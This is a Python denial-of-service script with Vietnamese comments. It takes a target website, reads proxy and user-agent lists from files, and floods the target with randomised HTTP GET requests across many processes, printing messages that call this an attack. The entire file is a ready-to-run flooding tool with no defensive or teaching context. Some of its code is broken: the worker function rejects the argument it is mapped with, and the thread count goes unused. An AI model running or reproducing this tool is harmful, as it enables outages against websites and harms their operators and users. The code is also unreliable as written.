import concurrent.futures
import random
import socket
import string
import sys
import threading
import time

# Lấy URL từ người dùng
url = input("Nhập URL: ")
port = 80

# Nhập số tiến trình và số luồng
num_processes = int(input("Nhập số tiến trình: "))
num_threads = int(input("Nhập số luồng: "))

# Tính tổng số yêu cầu dựa trên số tiến trình và số luồng
num_requests = num_processes * num_threads

# Đọc danh sách proxy từ file proxy.txt
with open("proxy.txt", "r") as file:
    proxies = file.readlines()

# Đọc danh sách user-agent từ file ua.txt
with open("ua.txt", "r") as file:
    user_agents = file.readlines()

# Chuyển đổi URL sang IP
try:
    host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("LỖI\n Hãy đảm bảo bạn đã nhập đúng địa chỉ website")
    sys.exit(2)

# Tạo biến chia sẻ cho số luồng
thread_num = 0
thread_num_mutex = threading.Lock()

# Hiển thị trạng thái luồng
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    # In kết quả trên cùng một dòng
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# Tạo URL Path ngẫu nhiên
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Thực hiện yêu cầu
def attack():
    print_status()
    url_path = generate_url_path()

    # Chọn proxy và user-agent ngẫu nhiên
    proxy = random.choice(proxies).strip()
    user_agent = random.choice(user_agents).strip()

    # Tạo socket raw
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Kết nối tới proxy
        dos.connect((proxy, port))

        # Gửi yêu cầu theo chuẩn HTTP với proxy và user-agent
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\nUser-Agent: {user_agent}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print(f"\n [ Không thể kết nối, máy chủ có thể đã tắt ]: {str(socket.error)}")
    finally:
        # Đóng socket một cách lịch sự
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

if __name__ == "__main__":
    print(f"[#] Cuộc tấn công bắt đầu trên {host} ({ip}) || Cổng: {str(port)} || Số yêu cầu: {str(num_requests)}")

    # Sử dụng context manager của concurrent.futures.ProcessPoolExecutor để tạo và quản lý tiến trình một cách tự động
    with concurrent.futures.ProcessPoolExecutor(max_workers=num_processes) as executor:
        # Sử dụng hàm executor.map để gọi hàm attack trong mỗi tiến trình
        executor.map(attack, range(num_processes))